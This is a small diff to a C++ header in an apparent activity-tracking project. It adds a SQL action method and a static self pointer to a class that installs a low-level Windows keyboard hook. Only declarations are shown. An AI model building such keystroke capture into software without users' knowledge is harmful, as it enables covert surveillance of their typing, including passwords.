@@ -26,10 +26,12 @@ class KeyboardCapture: public Capture {
 public:
     explicit KeyboardCapture();
     ~KeyboardCapture();
+    void sql_action(const Info*);
 private:
     static LRESULT llkeyhook(int nCode, WPARAM wParam, LPARAM lParam);
     static HHOOK keyboardHook;
     static bool exists;
+    static KeyboardCapture* self;
 };
 
 #endif //FLOBBEL_KEYPRESS_TYPE_H
